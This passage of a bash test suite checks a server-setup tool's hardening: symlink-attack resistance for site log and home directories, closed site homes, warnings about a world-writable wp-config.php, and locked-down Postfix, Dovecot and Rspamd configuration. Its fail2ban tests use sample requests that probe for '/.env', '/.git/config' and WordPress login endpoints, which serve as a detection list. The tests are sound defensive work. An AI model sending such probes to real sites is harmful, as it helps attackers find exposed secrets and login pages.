  "$(for _d in lr1 lr2 lr3 lr4; do _lvl <"$LSWS_VHOSTS_DIR/${_d}.example.com/vhconf.conf"; done | paste -sd' ' -)"
for _d in lr1 lr2 lr3 lr4; do
  assert_has "${_d} has its log directory, open to OpenLiteSpeed" "-P -m u:nobody:x ${SITES_LOG_ROOT}/${_d}.example.com" "$(cat "$SETFACL_LOG")"
done
assert_eq "one change set, reloaded, then what reads the logs - all before anything moves" \
  "begin|commit site logs pending=1 lr1-old=there|f2b lr1-old=there" "$(paste -sd'|' - <"$_lr_calls")"
if (( CAN_CHMOD )); then
  assert_eq   "lr1's history is in its log directory, its last live log at the end of the newest copy" \
    "$(printf 'lr1-rotated\nlr1-live')" "$(cat "$SITES_LOG_ROOT/lr1.example.com/access.log-20260102")"
  assert_false "and its old logs/ is gone"            test -d "$SITES_ROOT/lr1.example.com/logs" -a ! -L "$SITES_ROOT/lr1.example.com/logs"
fi
if (( CAN_SYMLINK )); then
  if (( CAN_CHMOD )); then assert_eq "its logs/ leads there now" "${SITES_LOG_ROOT}/lr1.example.com" "$(readlink "$SITES_ROOT/lr1.example.com/logs")"; fi
  assert_eq "the planted link is replaced"             "${SITES_LOG_ROOT}/lr3.example.com" "$(readlink "$SITES_ROOT/lr3.example.com/logs")"
  assert_eq "and nothing reached where it led"         "access.log" "$(ls -A "$TMP/lr-victim")"
  assert_eq "a site with no logs/ gets the link"       "${SITES_LOG_ROOT}/lr4.example.com" "$(readlink "$SITES_ROOT/lr4.example.com/logs")"
else
  assert_true "a file in place of logs/ is left alone" test -f "$SITES_ROOT/lr3.example.com/logs"
fi
assert_has   "logrotate reads the log directories" "${SITES_LOG_ROOT}/lr1.example.com/*.log" "$(cat "$LOGROTATE_SITES_FILE")"
assert_lacks "and no longer the homes"             "${SITES_ROOT}/lr1.example.com/logs" "$(cat "$LOGROTATE_SITES_FILE")"
# a second run has nothing to move and nothing to reload, once OpenLiteSpeed made every log
for _d in lr1 lr2 lr3 lr4; do : >>"$SITES_LOG_ROOT/${_d}.example.com/access.log"; done
: >"$_lr_calls"
lib_domain_logs_repair >"$TMP/lr-out" 2>&1
assert_eq  "a second run names nothing" "" "$DOMAIN_LOGS_MOVED"
assert_has "and reloads nothing"        "commit site logs pending=0" "$(cat "$_lr_calls")"
# a log directory somebody emptied gets its logs back only from a reload
rm -f "$SITES_LOG_ROOT/lr2.example.com/access.log"
: >"$_lr_calls"
lib_domain_logs_repair >"$TMP/lr-out" 2>&1
assert_has "a missing access.log is a reason to reload" "commit site logs pending=1" "$(cat "$_lr_calls")"
: >>"$SITES_LOG_ROOT/lr2.example.com/access.log"
# a dry run says what it would do and does none of it
rm -rf "$SITES_ROOT/lr1.example.com/logs" "$SITES_LOG_ROOT/lr1.example.com"
mkdir -p "$SITES_ROOT/lr1.example.com/logs"; printf 'lr1-live\n' >"$SITES_ROOT/lr1.example.com/logs/access.log"
_lr_old_vhconf >"$LSWS_VHOSTS_DIR/lr1.example.com/vhconf.conf"
cp "$LSWS_VHOSTS_DIR/lr1.example.com/vhconf.conf" "$TMP/lr-vh-before"
: >"$SETFACL_LOG"
OPT_DRY_RUN=1; OPT_QUIET=0 lib_domain_logs_repair >"$TMP/lr-out" 2>&1; OPT_DRY_RUN=0
assert_eq    "a dry run names what it would move" "lr1.example.com" "$DOMAIN_LOGS_MOVED"
# (the home comes out of domain.json, which the native jq of Git Bash writes as a C:/ path)
assert_has   "and says so"                        "would move the logs in " "$(cat "$TMP/lr-out")"
assert_has   "naming the site's old logs/"        "/lr1.example.com/logs to ${SITES_LOG_ROOT}/lr1.example.com" "$(cat "$TMP/lr-out")"
assert_eq    "sets no ACL"                        "" "$(cat "$SETFACL_LOG")"
assert_true  "writes no vhost"                    cmp -s "$LSWS_VHOSTS_DIR/lr1.example.com/vhconf.conf" "$TMP/lr-vh-before"
assert_true  "moves nothing"                      test -f "$SITES_ROOT/lr1.example.com/logs/access.log"
assert_false "and makes no directory"             test -e "$SITES_LOG_ROOT/lr1.example.com"
eval 'lib_webmail_installed() { return 0; }'
: >"$_lr_calls"
lib_domain_logs_repair >"$TMP/lr-out" 2>&1
assert_has "a server with the webmail gets its log directory put right too" "webmail dirs" "$(cat "$_lr_calls")"
: >"$_lr_calls"
OPT_DRY_RUN=1; lib_domain_logs_repair >"$TMP/lr-out" 2>&1; OPT_DRY_RUN=0
assert_lacks "a dry run with no vhost to change has nothing to test or reload" "commit" "$(cat "$_lr_calls")"
STATE_DIR="$_state_save"
eval "$_orig_cb"; eval "$_orig_cc"; eval "$_orig_wi"; eval "$_orig_wd"; eval "$_orig_rg"
unset -f _lr_old_vhconf _lr1_old _mk_old lib_ols_is_installed stat
unset FAKE_OWNER_UID
lib_domain_state_reset
_up="$(declare -f lib_update_main)"
assert_has  "update runs it" 'lib_domain_logs_repair' "$(declare -f lib_install_migrate)"
_n_rec="$(grep -n "'.last_update'" <<<"$_up" | head -1 | cut -d: -f1 || true)"
_n_rep="$(grep -n 'lib_install_migrate' <<<"$_up" | head -1 | cut -d: -f1 || true)"
assert_true "after the update itself is recorded" test "${_n_rep:-0}" -gt "${_n_rec:-0}"
_dc="$(declare -f _doc_check_domains)"
assert_has  "doctor checks every site's logs"              'lib_ols_logdir_open "$logs"' "$_dc"
assert_has  "and fails a vhost that still writes into the home" 'lib_domain_logs_in_home "$d"' "$_dc"
assert_has  "and a log directory another user could change"    '_doc_root_only "$logs"' "$_dc"

# =============================================================================
section "site homes: closed to the other sites' users"
# Every site runs as its own user, and to that user the next site's home belongs to "others". A
# home others could pass through let one site's PHP read every world-readable file of the next.
lib_domain_state_reset
D_DOMAIN="iso.example.com"; D_IDENT="iso_example_com"; D_USER="iso_example_com"; D_GROUP="iso_example_com"
D_HOME="$SITES_ROOT/iso.example.com"; D_MODE="php"; D_PHP="8.3"
: >"$SETFACL_LOG"
assert_eq  "the directory setup exits 0" 0 "$(run_isolated lib_domain_dirs_create)"
assert_has "OpenLiteSpeed's user is let into the home by name" "-m u:nobody:x ${D_HOME}" "$(cat "$SETFACL_LOG")"
if (( CAN_CHMOD )); then
  assert_eq "a new home is the site's and its group's only" 710 "$(stat -c %a "$D_HOME")"
  assert_eq "public_html stays readable to the server inside it" 755 "$(stat -c %a "$D_HOME/public_html")"
  chmod 0711 "$D_HOME"
  run_isolated lib_domain_dirs_create >/dev/null
  assert_eq "setting a site up again closes an open home" 710 "$(stat -c %a "$D_HOME")"
fi
lib_rollback_clear; rm -rf "$D_HOME" "$SITES_LOG_ROOT/iso.example.com"
# update, for the homes an older release left open
_state_save="$STATE_DIR"; STATE_DIR="$TMP/iso-state"
_orig_dl="$(declare -f lib_domains_list)"
eval "$(sed -n '/^lib_domains_list() {/,/^}/p' "$ROOT/lib/common.sh")"
for _d in is1.example.com is2.example.com is3.example.com is4.example.com; do
  _i="${_d//./_}"
  mkdir -p "$STATE_DIR/domains/$_d"
  jq -n --arg d "$_d" --arg i "$_i" --arg h "$SITES_ROOT/$_d" \
    '{domain:$d, ident:$i, user:$i, group:$i, home:$h, mode:"php",
      php:{version:"8.3", children:4, memory_limit:"256M", upload_max:"64M"}}' >"$STATE_DIR/domains/$_d/domain.json"
done
mkdir -p "$SITES_ROOT/is1.example.com/public_html" "$SITES_ROOT/is2.example.com" "$TMP/iso-victim"
printf 'x\n' >"$SITES_ROOT/is1.example.com/public_html/config.php"
assert_true "a home that is missing has nothing to close" lib_domain_home_closed "$SITES_ROOT/is4.example.com"
if (( CAN_CHMOD )); then
  chmod 0711 "$SITES_ROOT/is1.example.com"; chmod 0755 "$SITES_ROOT/is1.example.com/public_html"
  chmod 0644 "$SITES_ROOT/is1.example.com/public_html/config.php"
  chmod 0710 "$SITES_ROOT/is2.example.com"; chmod 0755 "$TMP/iso-victim"
  if (( CAN_SYMLINK )); then ln -s "$TMP/iso-victim" "$SITES_ROOT/is3.example.com"; fi
  assert_false "0711 lets other accounts in" lib_domain_home_closed "$SITES_ROOT/is1.example.com"
  assert_true  "0710 does not"               lib_domain_home_closed "$SITES_ROOT/is2.example.com"
  : >"$SETFACL_LOG"
  OPT_DRY_RUN=1; lib_domain_isolation_repair >/dev/null 2>&1; OPT_DRY_RUN=0
  assert_eq "a dry run names the open home"  "is1.example.com" "$DOMAIN_ISOLATED"
  assert_eq "and leaves it as it is"         711 "$(stat -c %a "$SITES_ROOT/is1.example.com")"
  assert_eq "with no ACL set"                "" "$(cat "$SETFACL_LOG")"
  lib_domain_isolation_repair >/dev/null 2>&1
  assert_eq "update names the home it closed" "is1.example.com" "$DOMAIN_ISOLATED"
  assert_eq "and closes it"                   710 "$(stat -c %a "$SITES_ROOT/is1.example.com")"
  # (the home comes out of domain.json, which the native jq of Git Bash writes as a C:/ path)
  assert_eq "OpenLiteSpeed's user is let in, and only there" 1 "$(grep -c -- '-m u:nobody:x .*is1\.example\.com$' "$SETFACL_LOG")"
  assert_eq "no other home is touched"        1 "$(grep -c . "$SETFACL_LOG")"
  assert_eq "nothing below it changes: the docroot" 755 "$(stat -c %a "$SITES_ROOT/is1.example.com/public_html")"
  assert_eq "nor a file"                      644 "$(stat -c %a "$SITES_ROOT/is1.example.com/public_html/config.php")"
  assert_eq "a link in place of a home is not followed" 755 "$(stat -c %a "$TMP/iso-victim")"
  : >"$SETFACL_LOG"
  lib_domain_isolation_repair >/dev/null 2>&1
  assert_eq "a second run finds nothing open" "" "$DOMAIN_ISOLATED"
  assert_eq "and sets nothing"                "" "$(cat "$SETFACL_LOG")"
  # a home the server could not be let into stays open: closed without the ACL it serves nothing
  chmod 0711 "$SITES_ROOT/is1.example.com"
  _orig_sf="$(declare -f setfacl)"; eval 'setfacl() { return 1; }'
  _out="$(OPT_QUIET=0; lib_domain_isolation_repair 2>&1; printf 'named=%s' "$DOMAIN_ISOLATED")"
  eval "$_orig_sf"
  assert_eq  "without the ACL the home is left open" 711 "$(stat -c %a "$SITES_ROOT/is1.example.com")"
  assert_has "and is not reported closed"            "named=" "$(tail -n 1 <<<"$_out")"
  assert_lacks "by name"                             "named=is1" "$_out"
  assert_has "but warned about"                      "the home was left open to other accounts" "$_out"
fi
[[ -L "$SITES_ROOT/is3.example.com" ]] && rm -f "$SITES_ROOT/is3.example.com"
rm -rf "$SITES_ROOT/is1.example.com" "$SITES_ROOT/is2.example.com" "$TMP/iso-victim"
STATE_DIR="$_state_save"; eval "$_orig_dl"
lib_domain_state_reset
_mg="$(declare -f lib_install_migrate)"
assert_has "update and self-update close the homes" 'lib_domain_isolation_repair' "$_mg"
_n_iso="$(grep -n 'lib_domain_isolation_repair' <<<"$_mg" | head -1 | cut -d: -f1 || true)"
_n_rep="$(grep -n 'lib_domain_logs_repair' <<<"$_mg" | head -1 | cut -d: -f1 || true)"
assert_true "before the step a refused vhost can end the run at" test "${_n_iso:-99}" -lt "${_n_rep:-0}"
assert_has "doctor names a home that is open" 'lib_domain_home_closed "$D_HOME"' "$(declare -f _doc_check_domains)"
assert_has "setup.sh has the command self-update runs" 'migrate)        lib_migrate_main' "$(cat "$ROOT/setup.sh")"

mkdir -p "$LSWS_VHOSTS_DIR/ih.example.com"
printf 'errorlog $VH_ROOT/logs/error.log {\n}\n' >"$LSWS_VHOSTS_DIR/ih.example.com/vhconf.conf"
assert_true  "a vhost an older release rendered writes into the home" lib_domain_logs_in_home ih.example.com
printf 'errorlog %s/error.log {\n}\n' "$SITES_LOG_ROOT/ih.example.com" >"$LSWS_VHOSTS_DIR/ih.example.com/vhconf.conf"
assert_false "one rendered now does not"                             lib_domain_logs_in_home ih.example.com
rm -rf "$LSWS_VHOSTS_DIR/ih.example.com"
if (( CAN_CHMOD )); then
  mkdir -p "$TMP/ro"; chmod 0750 "$TMP/ro"
  if (( EUID == 0 )); then assert_true "doctor: a 0750 directory of root's is root's only" _doc_root_only "$TMP/ro"
  else assert_false "doctor: a directory that is not root's is not root's only" _doc_root_only "$TMP/ro"; fi
  chmod 0770 "$TMP/ro"
  assert_false "doctor: nor one whose group may write to it" _doc_root_only "$TMP/ro"
  rm -rf "$TMP/ro"
fi
assert_has  "and the webmail's"                            'lib_ols_logdir_open "$WM_LOG_DIR"' "$(declare -f _doc_check_webmail)"

# WordPress's installer, run in the browser, leaves the wp-config.php it wrote 0666. doctor
# names such a file with the command that closes it, and does no more than look at it.
lib_domain_state_reset
D_DOMAIN="wpc.example.com"; D_USER="wpc_example_com"; D_GROUP="wpc_example_com"
D_HOME="$SITES_ROOT/wpc.example.com"; D_MODE="php"
_wc_f="$D_HOME/public_html/wp-config.php"
_wc_doc() { DOC_RESULTS=(); DOC_FAIL=0; DOC_WARN=0; DOC_OK=0; _doc_site_wp_config wpc.example.com; printf '%s' "${DOC_RESULTS[*]-}"; }
DOC_RESULTS=(); DOC_FAIL=0; DOC_WARN=0; DOC_OK=0
assert_eq "doctor: a site whose document root is missing has no wp-config.php to name" "" "$(_wc_doc)"
mkdir -p "$D_HOME/public_html"
assert_eq "nor has a site without WordPress"   "" "$(_wc_doc)"
assert_eq "and the check exits 0"              0 "$(run_isolated _doc_site_wp_config wpc.example.com)"
if (( CAN_CHMOD )); then
  printf '<?php // config\n' >"$_wc_f"; chmod 0666 "$_wc_f"
  # whose the file is decides what doctor says to do: the numbers come from a stub, as in the
  # fix-owner section, because the suite cannot own a file as anybody else
  _wc_orig_ids="$(declare -f _domain_fix_owner_ids)"
  eval '_domain_fix_owner_ids() { printf "%s" "$_wc_ids"; [[ "$_wc_ids" == [0-9]* ]]; }'
  read -r _wc_u _wc_g < <(stat -c '%u %g' "$_wc_f")
  _wc_ids="${_wc_u} ${_wc_g}"
  _wc_o="$(_wc_doc)"
  assert_has "doctor: the 0666 WordPress's installer leaves is a warning" "WARN|site wpc.example.com: wp-config.php|${_wc_f} is 0666: " "$_wc_o"
  assert_has "the site's own file is one the minute check closes, and the command is named in case it does not: as the site's user, never a chmod for root to run" "if it stays open: runuser -u wpc_example_com -- chmod 640 ${_wc_f}" "$_wc_o"
  _wc_ids="$(( _wc_u + 1 )) ${_wc_g}"; _wc_o="$(_wc_doc)"
  assert_has "a file that is not the site's own is named with fix-owner" "setup.sh fix-owner wpc.example.com" "$_wc_o"
  assert_lacks "and not with a chmod that would leave PHP unable to read it" "if it stays open" "$_wc_o"
  _wc_ids="its user wpc_example_com does not exist"
  assert_has "so is the file of a site whose account is not there" "setup.sh fix-owner wpc.example.com" "$(_wc_doc)"
  _wc_ids="${_wc_u} ${_wc_g}"
  assert_eq  "the check exits 0 with a finding too"   0 "$(run_isolated _doc_site_wp_config wpc.example.com)"
  assert_eq  "and leaves the file as it found it"     666 "$(stat -c %a "$_wc_f")"
  D_MODE="wordpress"
  assert_has "a site added with --wordpress is looked at the same way" "WARN|site wpc.example.com: wp-config.php|" "$(_wc_doc)"
  chmod 0660 "$_wc_f"
  assert_has "a file only its group may write to is named" "${_wc_f} is 0660: " "$(_wc_doc)"
  chmod 0602 "$_wc_f"
  assert_has "and one only others may write to"       "${_wc_f} is 0602: " "$(_wc_doc)"
  chmod 0640 "$_wc_f"
  assert_eq  "0640, which lomp sets itself, is no finding" "" "$(_wc_doc)"
  chmod 0644 "$_wc_f"
  assert_eq  "nor is a file others can only read"     "" "$(_wc_doc)"
  chmod 0666 "$_wc_f"
  for _m in static proxy; do
    D_MODE="$_m"
    assert_eq "no PHP runs in a ${_m} site: a wp-config.php there is not looked at" "" "$(_wc_doc)"
  done
  D_MODE="php"
  if (( CAN_SYMLINK )); then
    # a link is the site user's to point anywhere, and the chmod doctor names would follow it
    mv "$_wc_f" "$TMP/wpc-victim.php"; ln -s "$TMP/wpc-victim.php" "$_wc_f"
    assert_eq "a link in place of wp-config.php is not named" "" "$(_wc_doc)"
    rm -f "$_wc_f"; mv "$D_HOME/public_html" "$TMP/wpc-docroot"; mv "$TMP/wpc-victim.php" "$TMP/wpc-docroot/wp-config.php"
    ln -s "$TMP/wpc-docroot" "$D_HOME/public_html"
    assert_true "(the file behind the linked document root is there, and 0666)" test "$(stat -c %a "$D_HOME/public_html/wp-config.php")" = 666
    assert_eq "nor is a file behind a link in place of the document root" "" "$(_wc_doc)"
    rm -f "$D_HOME/public_html"
  fi
  eval "$_wc_orig_ids"
fi
rm -rf "$D_HOME" "$TMP/wpc-docroot" "$TMP/wpc-victim.php"
unset -f _wc_doc; unset DOC_RESULTS DOC_FAIL DOC_WARN DOC_OK
lib_domain_state_reset
assert_has  "doctor looks at the wp-config.php of every site" '_doc_site_wp_config "$d"' "$(declare -f _doc_check_domains)"

# ...and the fail2ban web jails have to match what is written there. fail2ban cuts the date
# out before it applies a failregex - "[28/Sep/2026:19:56:50 +0300]" becomes "[]" - and both
# filters wanted a character between the brackets, so they matched no line. These are
# OpenLiteSpeed's lines with the date cut; grep -P reads the patterns as fail2ban's Python does.
lib_domain_fail2ban_filters_write
_f2b_match() {   # filter line -> 0 when its failregex matches the line
  local re=""
  re="$(sed -n 's/^failregex = //p' "${FAIL2BAN_FILTER_DIR}/$1.conf")"
  printf '%s\n' "$2" | grep -qP -- "${re//<HOST>/[0-9.]+}"
}
if printf 'x\n' | grep -qP 'x' 2>/dev/null; then
  assert_true  "a probe for /.env is caught"     _f2b_match server-setup-web-probe '203.0.113.7 - - [] "GET /.env?x HTTP/1.1" 403 1240 "-" "curl/8.5.0"'
  assert_true  "over HTTP/2 too"                  _f2b_match server-setup-web-probe '203.0.113.7 - - [] "GET /.git/config HTTP/2" 404 1240 "-" "curl/8.5.0"'
  assert_false "a page that is served is not"     _f2b_match server-setup-web-probe '203.0.113.9 - - [] "GET / HTTP/1.1" 200 386 "-" "Mozilla/5.0"'
  assert_true  "a WordPress login POST is caught" _f2b_match server-setup-wp-login '203.0.113.8 - - [] "POST /wp-login.php HTTP/2" 200 1249 "-" "Mozilla/5.0"'
  assert_true  "and one to xmlrpc.php"            _f2b_match server-setup-wp-login '203.0.113.8 - - [] "POST //xmlrpc.php HTTP/1.1" 403 1249 "-" "Mozilla/5.0"'
  assert_false "the login page itself is not"     _f2b_match server-setup-wp-login '203.0.113.9 - - [] "GET /wp-login.php HTTP/1.1" 200 386 "-" "Mozilla/5.0"'
fi
# fail2ban reads a rewritten filter only on a reload, and the jail file did not change
_orig_sa="$(declare -f lib_service_active)"; _orig_run="$(declare -f lib_run)"; _orig_pi="$(declare -f lib_pkg_installed)"
eval 'lib_pkg_installed()  { [[ "$1" == "fail2ban" ]]; }'
eval 'lib_service_active() { return 0; }'
eval 'lib_run()            { printf "%s\n" "$*" >>"$TMP/f2b-runs"; }'
lib_domain_fail2ban_regen >/dev/null 2>&1
printf 'failregex = an older release\n' >"${FAIL2BAN_FILTER_DIR}/server-setup-web-probe.conf"
: >"$TMP/f2b-runs"
lib_domain_fail2ban_regen >/dev/null 2>&1
assert_has "a rewritten filter reloads fail2ban" "fail2ban-client reload" "$(cat "$TMP/f2b-runs")"
: >"$TMP/f2b-runs"
lib_domain_fail2ban_regen >/dev/null 2>&1
assert_eq  "an unchanged one does not"           "" "$(cat "$TMP/f2b-runs")"
eval "$_orig_sa"; eval "$_orig_run"; eval "$_orig_pi"

# =============================================================================
section "the mail server's own configuration"
# These assertions are the mail server's security policy in the only form that matters: the
# lines Postfix and Dovecot actually read. A renderer is pure, so a test can read every one of
# them without a package installed.
_pf="$(lib_mail_render_postfix_main mail.example.com hash ipv4)"
assert_has "the server knows the name it sends as" "myhostname = mail.example.com" "$_pf"
# mail the system sends to root must land here, not be posted back to this server as a relay
assert_has "this machine is a destination for its own mail" 'mydestination = $myhostname, localhost.$mydomain, localhost' "$_pf"
assert_has "relaying needs a login, even from this machine" "smtpd_relay_restrictions = permit_sasl_authenticated, reject_unauth_destination" "$_pf"
# a site broken into reaches 127.0.0.1:25 as easily as anything else
assert_lacks "being on the server is not a reason to relay" "smtpd_relay_restrictions = permit_mynetworks" "$_pf"
assert_has "a recipient nobody here has is refused" "reject_unlisted_recipient" "$_pf"
assert_has "no authentication before TLS" "smtpd_tls_auth_only = yes" "$_pf"
assert_has "and none at all on port 25" "smtpd_sasl_auth_enable = no" "$_pf"
assert_has "a sender must be one the login owns" "smtpd_sender_login_maps = hash:/etc/postfix/lomp/senders" "$_pf"
# the rule lives on the submission ports: Postfix skips it where SASL is off, and says so
# in the log on every single connection
assert_lacks "no sender rule where it would only be noise" "smtpd_sender_restrictions" "$_pf"
# being on the machine must not skip the sender rule or the quota check either
assert_lacks "loopback gets no free pass on recipients" $'smtpd_recipient_restrictions =\n    permit_mynetworks' "$_pf"
assert_has "the filter is reached through a socket, not a port" "smtpd_milters = unix:/run/rspamd/milter.sock" "$_pf"
# Dovecot is on this list beside root because a sieve script is Dovecot's: the webmail's own
# forward and holiday reply are sent by Pigeonhole forking sendmail(1) as vmail, and postdrop
# refused it - which Pigeonhole reads as a temporary failure, so the message that triggered the
# rule was re-queued for three days and then bounced. No site user can become vmail.
assert_has "root and Dovecot may hand mail to sendmail" "authorized_submit_users = root, ${MAIL_VMAIL_USER}" "$_pf"
assert_lacks "and nobody else"                          "authorized_submit_users = root"$'\n' "$_pf"
assert_has "delivery belongs to Dovecot" "virtual_transport = lmtp:unix:private/dovecot-lmtp" "$_pf"
assert_has "a full mailbox is refused at the door" "check_policy_service unix:private/quota-status" "$_pf"
assert_has "the mail host's own certificate is served" "smtpd_tls_chain_files = ${SSL_DEPLOY_DIR}/_mailhost/privkey.pem" "$_pf"
assert_lacks "nothing is relayed away while no relay is set" "relayhost" "$_pf"
assert_has "the table type follows what Postfix has" "virtual_mailbox_maps = lmdb:" "$(lib_mail_render_postfix_main mail.example.com lmdb ipv4)"
_pfr="$(lib_mail_render_postfix_main mail.example.com hash ipv4 smtp.example.net 2587)"
assert_has "a relay is used where one is set" "relayhost = [smtp.example.net]:2587" "$_pfr"
assert_has "with credentials from a map, not from here" "smtp_sasl_password_maps = hash:/etc/postfix/lomp/sasl_passwd" "$_pfr"
# "encrypt" demands STARTTLS and then verifies nothing, so anything that can answer for the
# relay's name presents whatever certificate it likes and is handed the AUTH line. "secure"
# checks the certificate against the name in relayhost.
assert_has "and never in the clear"        "smtp_tls_security_level = secure" "$_pfr"
assert_has "nor to whoever answers first"  "smtp_tls_CAfile" "$_pfr"
_pfre="$(lib_mail_render_postfix_main mail.example.com hash ipv4 smtp.example.net 2587 encrypt)"
assert_has   "a relay with a private certificate can be told to accept less" "smtp_tls_security_level = encrypt" "$_pfre"
assert_lacks "and then there is nothing to check it against"                 "smtp_tls_CAfile" "$_pfre"
assert_has   "an unset TLS level reads as the safe one" "secure" "$(lib_mail_relay_get tls)"

_mc="$(lib_mail_render_postfix_master)"
assert_eq "every submission port checks sender against login" 3 "$(grep -c 'reject_authenticated_sender_login_mismatch' <<<"$_mc")"
assert_eq "and every one of them demands a password" 3 "$(grep -c 'smtpd_sasl_auth_enable=yes' <<<"$_mc")"
assert_eq "an unsigned message never leaves the building" 3 "$(grep -c 'milter_default_action=tempfail' <<<"$_mc")"
# what port 25 does is decided in its own block, which ends where the next service begins
_smtp25="$(awk '/^smtp +inet/{f=1;next} /^[a-z0-9.:]+ +(inet|unix)/{f=0} f' <<<"$_mc")"
assert_lacks "port 25 offers no authentication at all" "smtpd_sasl_auth_enable=yes" "$_smtp25"
assert_has "and takes mail in even when the filter is down" "milter_default_action=accept" "$_smtp25"
# Postfix evaluates the HELO rules at RCPT time, so main.cf's "needs a fully-qualified name"
# reached authenticated clients too: Outlook says EHLO <computer name>, with no dot, and got
# "504 Helo command rejected" on the first recipient - able to receive, never able to send.
# Port 25 keeps the strict list, where a stranger's HELO is worth something.
assert_eq  "every submission port relaxes the HELO rules" 3 "$(grep -c 'smtpd_helo_restrictions=permit_mynetworks,permit_sasl_authenticated,reject_invalid_helo_hostname' <<<"$_mc")"
assert_lacks "port 25 keeps the strict ones"              "smtpd_helo_restrictions" "$_smtp25"
assert_has  "which still ask for a name that resolves"    "reject_non_fqdn_helo_hostname" "$_pf"
# The webmail has a submission port of its own, and it is the only one without TLS. That is
# only safe while it is bound to the loopback: on any other address it would be a password
# on the wire, so the address is part of the line and not a setting somewhere else.
assert_has  "the webmail submits on its own port" "127.0.0.1:10587 inet" "$_mc"
_wmport="$(sed -n '/^127.0.0.1:10587/,/^[a-z0-9]/p' <<<"$_mc")"
assert_has  "without TLS, because it never leaves the machine" "smtpd_tls_security_level=none" "$_wmport"
assert_has  "but never without a password"                     "smtpd_sasl_auth_enable=yes"    "$_wmport"
assert_has  "and never as somebody else"                       "reject_authenticated_sender_login_mismatch" "$_wmport"
assert_has  "and never unsigned"                               "milter_default_action=tempfail" "$_wmport"
assert_lacks "no other port takes a password in the clear" "smtpd_tls_security_level=none" "$_smtp25"

_dc="$(lib_mail_render_dovecot_local mail.example.com)"
assert_eq "the Dovecot configuration closes every brace it opens" 0 \
  "$(awk '{o+=gsub(/\{/,"{"); c+=gsub(/\}/,"}")} END{print o-c}' <<<"$_dc")"
assert_has "no mailbox is opened without TLS" "ssl = required" "$_dc"
# Dovecot treats a loopback connection as already secure, so a plain 143 would be a password
# oracle for every user of the machine - even now that there is a webmail, which speaks TLS
# to 993 like any other client
assert_has "plain IMAP is switched off" $'inet_listener imap {\n    port = 0' "$_dc"
assert_has "IMAPS is the way in" $'inet_listener imaps {\n    port = 993' "$_dc"
# ManageSieve is what the webmail's filters and holiday replies talk to. The protocol has to
# be named here too: this file is read last and would otherwise override the line the
# managesieved package drops into protocols.d, and the service would never start.
assert_has "sieve is one of the protocols" "protocols = imap lmtp sieve" "$_dc"
assert_has "and ManageSieve listens"       $'inet_listener sieve {\n    address = 127.0.0.1\n    port = 4190' "$_dc"
assert_has "Postfix authenticates through Dovecot" "/var/spool/postfix/private/auth" "$_dc"
assert_has "and delivers through it" "/var/spool/postfix/private/dovecot-lmtp" "$_dc"
assert_has "every mailbox is one directory" "mail_location = maildir:/var/vmail/%Ld/%Ln/Maildir" "$_dc"
# Dovecot expands % in a plugin value, so a literal percent has to be written twice
assert_has "the quota grace survives that expansion" "quota_grace = 10%%" "$_dc"
assert_has "and the count backend gets its index" "mailbox_list_index = yes" "$_dc"
assert_has "spam lands in Junk, never in the bin" "sieve_before = /etc/dovecot/sieve/spam-to-junk.sieve" "$_dc"
assert_lacks "and a Linux account is not a mailbox" "auth-system" "$_dc"
# that one only says local.conf does not ask for it; this one runs the code that takes the
# packaged include away, which is what actually keeps a site user out of IMAP
MAIL_DOVECOT_10AUTH="$TMP/10-auth.conf"
printf 'auth_mechanisms = plain\n!include auth-system.conf.ext\n#!include auth-passwdfile.conf.ext\n' >"$MAIL_DOVECOT_10AUTH"
MAIL_CHANGED=0
lib_mail_pam_disable >/dev/null 2>&1
assert_has   "the packaged system-user include is commented out" '#!include auth-system.conf.ext' "$(cat "$MAIL_DOVECOT_10AUTH")"
assert_eq    "no line of it is left active" 0 "$(grep -c '^[[:space:]]*!include auth-system' "$MAIL_DOVECOT_10AUTH" || true)"
assert_eq    "and that counts as a change, so Dovecot is restarted" 1 "$MAIL_CHANGED"
MAIL_CHANGED=0
lib_mail_pam_disable >/dev/null 2>&1
assert_eq    "running it again changes nothing" 0 "$MAIL_CHANGED"
_da="$(lib_mail_render_dovecot_auth)"
assert_has "the user store is a file of hashes" "scheme=BLF-CRYPT" "$_da"
assert_has "owned by one user that owns no site" "uid=vmail gid=vmail" "$_da"
assert_lacks "and there is no PAM anywhere near it" "pam" "$_da"

_dk="$(lib_mail_render_rspamd_dkim dkim_signing)"
assert_has "only an authenticated sender is signed for" "sign_authenticated = true" "$_dk"
assert_has "being local is not a reason to sign" "sign_local = false" "$_dk"
assert_has "and the From: domain must own the key" "allow_hdrfrom_mismatch = false" "$_dk"
_rc="$(lib_mail_render_rspamd_worker_controller 'Sup3rS3cretControllerPw')"
assert_has "the Rspamd interface has no port" 'bind_socket = "/run/rspamd/controller.sock' "$_rc"
assert_has "it still asks for a password over that socket" 'enable_password = "Sup3rS3cretControllerPw"' "$_rc"
assert_lacks "and trusts no address without one" "secure_ip = [\"127.0.0.1\"]" "$_rc"
assert_lacks "and without one, sets none" 'enable_password = "' "$(lib_mail_render_rspamd_worker_controller '')"
_rp="$(lib_mail_render_rspamd_worker_proxy)"
# whoever speaks the milter protocol says who authenticated, and that is what DKIM signs on
assert_has "the milter is a socket only Postfix can open" 'bind_socket = "/run/rspamd/milter.sock mode=0660 owner=_rspamd group=lompmilter"' "$_rp"
assert_lacks "not a port any local user can reach" "127.0.0.1:11332" "$_rp"
assert_has "the unused worker is switched off, not merely set to zero" "enabled = false" "$(lib_mail_render_rspamd_worker_normal)"
_rl="$(lib_mail_render_rspamd_ratelimit)"
# the bucket is keyed on the account, which is what a compromised site would be sending with
assert_has "an account may send 100 messages an hour" 'rate = "100 / 1h"' "$_rl"
_rr="$(lib_mail_render_rspamd_redis)"
assert_has "Rspamd talks to its own Redis over a socket" "/run/lomp-redis-rspamd/redis.sock" "$_rr"
_ru="$(lib_mail_render_redis_unit)"
assert_has "which runs as the filter's own user" "User=_rspamd" "$_ru"
# what the filter learned about this server's mail is nobody else's business
assert_has "its dataset on disk is closed to everyone else" "StateDirectoryMode=0700" "$_ru"
assert_has "including the files it writes there" "UMask=0077" "$_ru"
assert_has "and it starts before the filter that needs it" "Before=rspamd.service" "$_ru"
_rk="$(lib_mail_render_redis_conf)"
assert_has "and answers on no TCP port" "port 0" "$_rk"
assert_has "with a socket nobody else can open" "unixsocketperm 700" "$_rk"

_j="$(lib_mail_render_jails)"
assert_has "fail2ban reads Postfix where Ubuntu logs it" "journalmatch = _SYSTEMD_UNIT=postfix@-.service" "$_j"
assert_has "and Dovecot the same way" "journalmatch = _SYSTEMD_UNIT=dovecot.service" "$_j"
# the addresses never to ban are in the [DEFAULT] section of the base jail file, which
